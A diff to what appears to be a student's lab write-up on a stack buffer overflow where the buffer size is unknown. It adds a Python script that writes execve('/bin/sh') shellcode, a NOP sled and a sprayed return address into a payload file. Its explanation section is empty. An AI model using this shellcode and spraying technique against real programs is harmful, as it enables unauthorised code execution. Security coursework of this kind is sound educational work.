@@ -472,20 +472,52 @@ with open('badfile', 'wb') as f:
 
 ###  Launching Attack without Knowing Buffer Size (Level 2)
 
-In the Level-1 attack, using gdb, we get to know the size of the buffer. In the real world, this piece of
-information may be hard to get. For example, if the target is a server program running on a remote machine,
-we will not be able to get a copy of the binary or source code. In this task, we are going to add a constraint:
-you can still use gdb, but you are not allowed to derive the buffer size from your investigation. Actually,
-the buffer size is provided in Makefile, but you are not allowed to use that information in your attack.
-Your task is to get the vulnerable program to run your shellcode under this constraint. We assume that
-you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful
-to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four
-(for 32-bit programs).
-Please be noted, you are only allowed to construct one payload that works for any buffer size within this
-range. You will not get all the credits if you use the brute-force method, i.e., trying one buffer size each
-time. The more you try, the easier it will be detected and defeated by the victim. That’s why minimizing the
-number of trials is important for attacks. In your lab report, you need to describe your method, and provide
-evidences.
+Some times, we will not be able to get a copy of the binary or source code. This means that we will not be able to use gdb to derive the buffer size
+e assume that you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four (for 32-bit programs).
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+   "\xeb\x15\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
+   "\x08\x31\xd2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff\x2f\x62\x69\x6e"
+   "\x2f\x73\x68\x2a\x41\x41\x41\x41\x42\x42\x42\x42"
+).encode('latin-1')
+
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)               # Change this number 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value and put it somewhere in the payload
+max_buffs = 200 + 20                      # We know that the buffer is within the range of 100 to 200.
+                                          # Thus we add some bytes to account for additional space.
+ret    = 0xffffcb38 + max_buffs           # This number should be larger than the known buffer size
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+
+# Spray the first max_buffs
+for _ in range(0, max_buffs + L, L):
+    content[_:_ + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+<details>
+<summary>Brief explanation of exploit code</summary>
+###
+</details>
+
+
 
 
 
